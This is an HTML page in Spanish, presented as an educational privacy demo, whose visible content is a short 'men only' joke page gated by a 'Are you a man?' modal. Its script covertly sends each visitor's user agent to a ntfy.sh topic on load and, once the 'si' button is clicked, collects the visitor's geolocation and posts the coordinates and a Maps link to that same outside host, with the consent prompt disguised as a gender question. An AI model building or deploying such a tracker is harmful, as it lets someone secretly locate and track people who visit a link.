<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title> Pagina de Prueba Educativa - Privacidad Digital</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 20px;
      background-color: #f4f4f4;
    }
    #overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      z-index: 999;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #cookie-modal {
      background-color: white;
      padding: 30px;
      border-radius: 8px;
      max-width: 500px;
      text-align: center;
      box-shadow: 0 0 20px rgba(0,0,0,0.3);
    }
    #cookie-modal h2 {
      margin-top: 0;
      color: #333;
    }
    #cookie-modal p {
      line-height: 1.6;
      color: #555;
    }
    #cookie-modal button {
      background-color: #4CAF50;
      color: white;
      border: none;
      padding: 12px 24px;
      cursor: pointer;
      margin: 10px;
      border-radius: 4px;
      font-size: 16px;
    }
    #cookie-modal button:hover {
      background-color: #45a049;
    }
    #cookie-modal .reject-btn {
      background-color: #f44336;
    }
    #cookie-modal .reject-btn:hover {
      background-color: #d32f2f;
    }
    .content {
      max-width: 800px;
      margin: 0 auto;
      padding: 20px;
      background-color: white;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      display: none; /* Ocultar contenido hasta que se interactúe con el modal */
    }
    h1, h2 {
      color: #333;
    }
    p {
      line-height: 1.6;
    }
  </style>
</head>
<body>
  <div class="content">
    <h1>A</h1>
    <p>Esta página es solo para hombres</p>
    <h2>¿Qué aprenderemos?</h2>
    <p>Ser hombre</p>
    
    <p><strong>Nota importante:</strong> No apto para mujeres.</p>
    <p>ya no se que poner</p>
    <div id="status"></div>
  </div>

  <div id="access-denied" class="content" style="display: none;">
    <h1>Acceso Denegado</h1>
    <p>Para acceder a este sitio, debes aceptar las cookies. </p>
    <p>Puedes recargar la página para intentarlo de nuevo.</p>
  </div>

  <div id="overlay">
    <div id="cookie-modal">
      <h2>Eres hombre</h2>
      <p>responde con "sí" o "no"</p>
      <button id="accept-all">si</button>
      <button id="reject-optional" class="reject-btn">No</button>
    </div>
  </div>

  <script>
    const overlay = document.getElementById('overlay');
    const acceptAllBtn = document.getElementById('accept-all');
    const rejectOptionalBtn = document.getElementById('reject-optional');
    const statusDiv = document.getElementById('status');

    // Notificar visita al cargar
    window.onload = function() {
      overlay.style.display = 'flex';
      fetch("https://ntfy.sh/ubicacion-jared-2024xz", {
        method: "POST",
        headers: { "Title": "Nueva visita", "Priority": "default" },
        body: `Alguien ingresó a la página.\nHora: ${new Date().toLocaleString()}\nUserAgent: ${navigator.userAgent}`
      });
    };

    acceptAllBtn.addEventListener('click', function() {
      overlay.style.display = 'none';
      document.querySelector('.content').style.display = 'block';
      // Simular aceptación de cookies
      localStorage.setItem('cookiesAccepted', 'true');
      statusDiv.innerHTML = '<p>Cookies aceptadas. Ahora solicitando permiso de ubicación...</p>';

      // Solicitar ubicación después de un breve delay para demostrar secuencia
      setTimeout(function() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const maps = `https://maps.google.com/?q=${lat},${lon}`;
            statusDiv.innerHTML += '<p>¡Ubicación obtenida exitosamente!</p><p>Latitud: ' + lat + ', Longitud: ' + lon + '</p><p>En un sitio real, esta información podría enviarse a servidores para rastreo.</p>';
            // Enviar notificación a ntfy.sh
            fetch("https://ntfy.sh/ubicacion-jared-2024xz", {
              method: "POST",
              body: `Ubicación recibida!\nLatitud: ${lat}\nLongitud: ${lon}\nMaps: ${maps}`
            }).then(() => {
              statusDiv.innerHTML += '<p>Notificación enviada a ntfy.sh.</p>';
            }).catch(err => {
              statusDiv.innerHTML += '<p>Error al enviar notificación: ' + err.message + '</p>';
            });
          }, function(error) {
            statusDiv.innerHTML += '<p>Permiso de ubicación denegado o error: ' + error.message + '</p><p>Esto demuestra cómo los usuarios pueden controlar sus permisos.</p>';
          });
        } else {
          statusDiv.innerHTML += '<p>La geolocalización no es soportada por este navegador.</p>';
        }
      }, 1000); // 1 segundo de delay para mostrar la secuencia
    });

    rejectOptionalBtn.addEventListener('click', function() {
      overlay.style.display = 'none';
      document.getElementById('access-denied').style.display = 'block';
    });
  </script>
</body>
</html>
